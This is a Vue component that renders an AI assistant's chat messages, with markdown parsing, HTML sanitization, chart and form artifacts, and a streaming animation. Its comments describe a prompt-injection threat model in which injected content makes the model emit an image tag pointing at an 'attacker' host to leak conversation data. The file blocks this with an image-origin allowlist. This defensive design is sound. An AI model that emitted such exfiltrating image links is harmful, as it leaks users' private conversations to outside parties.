<script setup lang="ts">
/**
 * Shared body renderer for assistant messages. Mounted by both the live
 * AssistantChatBubble and the chat-log MessageCard so chart artifacts and
 * the markdown pipeline live in one place.
 *
 * Owns: the marked instance + plugin config, streaming-aware debounced
 * render, code-block copy buttons, and the artifact-kind → component map.
 *
 * Does NOT own: feedback/copy buttons on the message itself, sources,
 * tool-call indicators, regenerate/edit affordances, avatars, bubble
 * styling. Those stay in the wrappers.
 */
import type { ToolArtifact } from '@/types/stream';
import DOMPurify from 'dompurify';
import hljs from 'highlight.js';
import { Marked } from 'marked';
import markedAlert from 'marked-alert';
import markedCodePreview from 'marked-code-preview';
import { markedHighlight } from 'marked-highlight';
import markedKatex from 'marked-katex-extension';
import { type Component, computed, nextTick, onMounted, onUnmounted, ref, watch } from 'vue';
import EChartBlock from './EChartBlock.vue';
import InlineFormBlock from './InlineFormBlock.vue';

/**
 * Image-exfiltration guard.
 *
 * Assistant output is attacker-influenceable (a prompt-injected KB chunk or
 * tool result can steer the model). DOMPurify already strips <script>/onerror,
 * but it leaves <img src="https://attacker/?leak=…"> intact, and the browser
 * auto-fetches it — a zero-click channel that exfiltrates conversation/PII to
 * an attacker host (and fires again in the operator's dashboard). There is no
 * img-src CSP on the widget surface to stop it.
 *
 * So we hard-restrict where rendered <img> may load from: same-origin, the
 * canonical app origin (chunk images are absolute to the main domain even on
 * an agent subdomain), and inline data: images (no network egress). Every other
 * src is dropped. Registered once at module load; applies to every
 * DOMPurify.sanitize() call in the app.
 */
const ALLOWED_IMG_ORIGINS = new Set<string>();
if (typeof window !== 'undefined') {
    ALLOWED_IMG_ORIGINS.add(window.location.origin);
    const appUrl = document.querySelector('meta[name="app-url"]')?.getAttribute('content');
    if (appUrl) {
        try {
            ALLOWED_IMG_ORIGINS.add(new URL(appUrl).origin);
        } catch {
            /* malformed meta — fall back to same-origin only */
        }
    }
}

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (!(node instanceof Element) || node.tagName !== 'IMG') {
        return;
    }

    const src = node.getAttribute('src') ?? '';

    // Inline images make no network request, so they cannot exfiltrate.
    if (src.startsWith('data:image/')) {
        return;
    }

    let allowed = false;
    try {
        const url = new URL(src, window.location.origin);
        allowed = (url.protocol === 'http:' || url.protocol === 'https:') && ALLOWED_IMG_ORIGINS.has(url.origin);
    } catch {
        allowed = false;
    }

    if (!allowed) {
        node.removeAttribute('src');
        node.removeAttribute('srcset');
    }
});

const props = withDefaults(
    defineProps<{
        content: string;
        artifacts?: ToolArtifact[];
        isStreaming?: boolean;
        isRTL?: boolean;
        // External id of the message that owns these artifacts — passed to the
        // inline-form renderer so a submit can stamp the read-only state back
        // onto this message for reload.
        messageId?: string;
    }>(),
    {
        artifacts: () => [],
        isStreaming: false,
        isRTL: false,
    },
);

/**
 * Kind → renderer map. Adding a new artifact type means adding one entry
 * here, not touching AssistantChatBubble or MessageCard. `toProps` lets
 * each renderer accept its own prop shape (EChartBlock wants `option`,
 * a future table block might want `rows`/`columns`, etc.).
 */
type ArtifactRenderer = {
    component: Component;
    toProps: (data: unknown) => Record<string, unknown>;
};

const ARTIFACT_RENDERERS: Record<string, ArtifactRenderer> = {
    echarts_option: {
        component: EChartBlock,
        toProps: (data) => ({ option: data }),
    },
    form: {
        component: InlineFormBlock,
        toProps: (data) => ({ form: data }),
    },
};

const renderableArtifacts = computed(() =>
    (props.artifacts ?? []).filter((a): a is ToolArtifact => a.kind in ARTIFACT_RENDERERS && a.data !== null && typeof a.data === 'object'),
);

const marked = new Marked(
    markedHighlight({
        emptyLangClass: 'hljs',
        langPrefix: 'hljs language-',
        highlight(code, lang) {
            const language = hljs.getLanguage(lang) ? lang : 'plaintext';
            return hljs.highlight(code, { language }).value;
        },
    }),
);

marked
    .use({ gfm: true })
    .use(
        markedKatex({
            throwOnError: false,
            errorColor: '#cc0000',
            strict: false,
        }),
    )
    .use(markedCodePreview())
    .use(markedAlert());

/**
 * Render one markdown chunk to sanitized HTML.
 *
 * Assistant/visitor content (and prompt-injected model output) is rendered
 * via v-html in both the live widget AND the privileged admin chat-log /
 * handoff UIs. Sanitize so injected <img onerror=…>, <script>, javascript:
 * hrefs, etc. can never execute. marked v15 does NOT sanitize.
 */
function renderMarkdown(text: string): string {
    const result = marked.parse(text);
    const html = typeof result === 'string' ? result : '';
    return DOMPurify.sanitize(html, { ADD_ATTR: ['target'] });
}

/**
 * Artifact anchoring.
 *
 * When a tool renders a visual, the model marks where it belongs by writing
 * a url-less markdown image like `![Five-year share price]` on its own line —
 * it knows a chart is coming but has no URL to point at. We treat each such
 * ON-ITS-OWN-LINE placeholder as an anchor and splice the matching artifact
 * (by order: 1st anchor → 1st artifact) in at that spot, so the visual lands
 * where the model intended instead of always above the whole message.
 *
 * Inline placeholders (mid-sentence, or inside a list/table) are NOT anchors —
 * splitting markdown there would shred the surrounding block — so they're
 * stripped, the same cleanup the old renderer applied to every placeholder.
 * Anchoring only runs when artifacts exist; without that signal a bare
 * `![...]` is left untouched (it may be legitimate copy).
 */
const ANCHOR_LINE = /^[ \t]*!\[[^\]]*\][ \t]*$/;
const INLINE_PLACEHOLDER = /!\[[^\]]*\](?!\()/g;

type RenderBlock = { type: 'html'; html: string } | { type: 'anchor'; index: number };

function buildBlocks(content: string, hasArtifacts: boolean): RenderBlock[] {
    if (!content) return [];
    if (!hasArtifacts) return [{ type: 'html', html: renderMarkdown(content) }];

    const blocks: RenderBlock[] = [];
    let buffer: string[] = [];
    let anchorIndex = 0;

    const flush = () => {
        if (buffer.length === 0) return;
        const text = buffer
            .join('\n')
            .replace(INLINE_PLACEHOLDER, '')
            .replace(/\n{3,}/g, '\n\n');
        if (text.trim() !== '') blocks.push({ type: 'html', html: renderMarkdown(text) });
        buffer = [];
    };

    for (const line of content.split('\n')) {
        if (ANCHOR_LINE.test(line)) {
            flush();
            blocks.push({ type: 'anchor', index: anchorIndex++ });
        } else {
            buffer.push(line);
        }
    }
    flush();

    return blocks;
}

// While streaming, debounce reparsing on a trailing edge — markdown +
// highlight.js is expensive on long responses. 60 ms is under the user
// perception threshold but caps CPU. When the stream ends or the
// component renders a stored message, flush immediately.
const renderBlocks = ref<RenderBlock[]>([]);
let renderDebounce: ReturnType<typeof setTimeout> | null = null;

function rebuild() {
    renderBlocks.value = buildBlocks(props.content ?? '', renderableArtifacts.value.length > 0);
}

function flushRender() {
    if (renderDebounce) {
        clearTimeout(renderDebounce);
        renderDebounce = null;
    }
    rebuild();
}

watch(
    () => props.content,
    () => {
        if (!props.isStreaming || renderBlocks.value.length === 0) {
            flushRender();
            return;
        }
        if (renderDebounce) return;
        renderDebounce = setTimeout(() => {
            renderDebounce = null;
            rebuild();
        }, 60);
    },
    { immediate: true },
);

watch(
    () => props.isStreaming,
    (streaming) => {
        if (!streaming) flushRender();
    },
);

// Artifacts can arrive AFTER some text has already streamed in (the tool
// result lands a few tokens late). Re-split when an artifact appears so the
// model's `![...]` anchors switch from stripped text to live components.
watch(
    () => renderableArtifacts.value.length,
    (count, prev) => {
        if (count !== prev) flushRender();
    },
);

/**
 * Flatten blocks + artifacts into the final ordered render list.
 *
 * - No anchor in the text → keep the historical layout (artifacts stacked
 *   above the body). Covers stored messages and replies where the model
 *   marked no position.
 * - Anchored → each artifact drops in at its matching anchor, by order. An
 *   anchor whose artifact hasn't streamed in yet shows a skeleton while
 *   streaming, and is dropped once settled. Surplus artifacts (more than
 *   anchors) append after the body so none is ever silently lost.
 */
type RenderItem = { type: 'html'; html: string; streaming: boolean } | { type: 'artifact'; artifact: ToolArtifact } | { type: 'skeleton' };

const renderItems = computed<RenderItem[]>(() => {
    const blocks = renderBlocks.value;
    const artifacts = renderableArtifacts.value;
    const anchorCount = blocks.reduce((n, b) => n + (b.type === 'anchor' ? 1 : 0), 0);

    if (anchorCount === 0) {
        const items: RenderItem[] = artifacts.map((artifact) => ({ type: 'artifact', artifact }));
        for (const block of blocks) {
            if (block.type === 'html') items.push({ type: 'html', html: block.html, streaming: props.isStreaming });
        }
        return items;
    }

    // Only the trailing text block is still growing mid-stream; blocks before
    // an anchor are already settled, so the fade mask shouldn't touch them.
    let lastHtml = -1;
    blocks.forEach((block, i) => {
        if (block.type === 'html') lastHtml = i;
    });

    const items: RenderItem[] = [];
    blocks.forEach((block, i) => {
        if (block.type === 'html') {
            items.push({ type: 'html', html: block.html, streaming: props.isStreaming && i === lastHtml });
            return;
        }
        const artifact = artifacts[block.index];
        if (artifact) items.push({ type: 'artifact', artifact });
        else if (props.isStreaming) items.push({ type: 'skeleton' });
    });

    for (let k = anchorCount; k < artifacts.length; k++) {
        items.push({ type: 'artifact', artifact: artifacts[k] });
    }

    return items;
});

onUnmounted(() => {
    if (renderDebounce) clearTimeout(renderDebounce);
});

const bodyRef = ref<HTMLElement>();

function setupCodeBlockCopyButtons() {
    if (!bodyRef.value) return;

    const codeBlocks = bodyRef.value.querySelectorAll('pre');
    codeBlocks.forEach((pre) => {
        if (pre.querySelector('.code-copy-button')) return;

        const copyButton = document.createElement('button');
        copyButton.className = 'code-copy-button';
        copyButton.setAttribute('aria-label', 'Copy code to clipboard');

        const copyIcon = document.createElement('span');
        copyIcon.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>`;
        copyButton.appendChild(copyIcon);

        copyButton.addEventListener('click', async (e) => {
            e.preventDefault();
            e.stopPropagation();

            const code = pre.querySelector('code');
            if (code) {
                try {
                    await navigator.clipboard.writeText(code.textContent || '');
                    copyButton.classList.add('copied');
                    copyIcon.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" /></svg>`;

                    setTimeout(() => {
                        copyButton.classList.remove('copied');
                        copyIcon.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>`;
                    }, 2000);
                } catch (err) {
                    console.error('Failed to copy code:', err);
                }
            }
        });

        pre.style.position = 'relative';
        pre.appendChild(copyButton);
    });
}

// Re-attach copy buttons whenever the rendered blocks change — a code fence
// can land in any block, and blocks re-render when an artifact arrives.
// Idempotent: setup skips any <pre> already wired.
watch(
    renderItems,
    () => {
        nextTick(() => setupCodeBlockCopyButtons());
    },
    { immediate: true },
);

onMounted(() => {
    if (props.content) {
        nextTick(() => setupCodeBlockCopyButtons());
    }
});
</script>

<template>
    <div id="chat-ai-responses" ref="bodyRef" class="assistant-message-body prose prose-sm dark:prose-invert w-full max-w-none" :data-rtl="isRTL">
        <!-- One ordered list: markdown text and artifacts (charts, forms)
             interleaved at the model's `![...]` anchors. When the model marks
             no position, artifacts stack above the body (legacy layout).
             See buildBlocks / renderItems. -->
        <template v-for="(item, i) in renderItems" :key="`item-${i}`">
            <div v-if="item.type === 'html'" class="streaming-content" :class="{ 'is-streaming': item.streaming }" v-html="item.html" />
            <component
                v-else-if="item.type === 'artifact'"
                :is="ARTIFACT_RENDERERS[item.artifact.kind].component"
                v-bind="ARTIFACT_RENDERERS[item.artifact.kind].toProps(item.artifact.data)"
                :message-id="item.artifact.kind === 'form' ? messageId : undefined"
            />
            <!-- Anchor whose artifact hasn't streamed in yet. Reserve the
                 chart's height so the canvas doesn't reflow when it mounts. -->
            <div v-else class="not-prose bg-card text-muted-foreground my-3 flex items-center justify-center rounded-md border" style="height: 320px">
                <span class="animate-pulse text-sm">Loading…</span>
            </div>
        </template>
    </div>
</template>

<style scoped>
/* ---------------------------------------------------------------
 * Streaming reveal.
 *
 * These rules used to live (scoped) in AssistantChatBubble, but the
 * `.streaming-content` element is rendered HERE, in the child. Vue
 * scoped styles don't reach a child's inner elements, so the whole
 * fade treatment silently stopped applying after that refactor —
 * leaving a raw, instant typewriter. They belong with the element
 * they style, so the scope matches and the fade actually shows.
 *
 * Effect: a tall trailing gradient mask + sub-pixel blur fades freshly
 * arrived text in at the leading (bottom) edge as it streams, plus a
 * breathing caret. When `is-streaming` flips off the mask/blur
 * transition out (320ms) so the final tokens settle instead of popping.
 * --------------------------------------------------------------- */
.streaming-content {
    --stream-fade: 0px;
    transition:
        -webkit-mask-image 320ms ease-out,
        mask-image 320ms ease-out,
        filter 320ms ease-out;
}

.streaming-content.is-streaming {
    /* 96px ≈ 3 lines of body text; the multi-stop falloff approximates
       an ease-out curve so the edge reads as "appearing" not "grey". */
    --stream-fade: 96px;
    -webkit-mask-image: linear-gradient(
        to bottom,
        #000 0,
        #000 calc(100% - var(--stream-fade)),
        rgba(0, 0, 0, 0.92) calc(100% - var(--stream-fade) * 0.78),
        rgba(0, 0, 0, 0.72) calc(100% - var(--stream-fade) * 0.55),
        rgba(0, 0, 0, 0.42) calc(100% - var(--stream-fade) * 0.32),
        rgba(0, 0, 0, 0.18) calc(100% - var(--stream-fade) * 0.14),
        transparent 100%
    );
    mask-image: linear-gradient(
        to bottom,
        #000 0,
        #000 calc(100% - var(--stream-fade)),
        rgba(0, 0, 0, 0.92) calc(100% - var(--stream-fade) * 0.78),
        rgba(0, 0, 0, 0.72) calc(100% - var(--stream-fade) * 0.55),
        rgba(0, 0, 0, 0.42) calc(100% - var(--stream-fade) * 0.32),
        rgba(0, 0, 0, 0.18) calc(100% - var(--stream-fade) * 0.14),
        transparent 100%
    );
    filter: blur(0.35px);
}

/* Breathing caret — soft pulse rather than a hard blink. Inherits the
   text color via currentColor (theme vars are full color functions, so
   wrapping them in hsl() would be invalid). */
.streaming-content.is-streaming::after {
    content: '▋';
    display: inline-block;
    margin-left: 2px;
    color: currentColor;
    transform-origin: bottom;
    filter: blur(0);
    animation: stream-cursor 1.1s ease-in-out infinite;
}

@keyframes stream-cursor {
    0%,
    100% {
        opacity: 0.85;
        transform: scaleY(1);
    }
    50% {
        opacity: 0.15;
        transform: scaleY(0.94);
    }
}

@media (prefers-reduced-motion: reduce) {
    .streaming-content.is-streaming {
        -webkit-mask-image: none;
        mask-image: none;
        filter: none;
    }
    .streaming-content.is-streaming::after {
        animation: none;
        opacity: 0.7;
    }
}
</style>
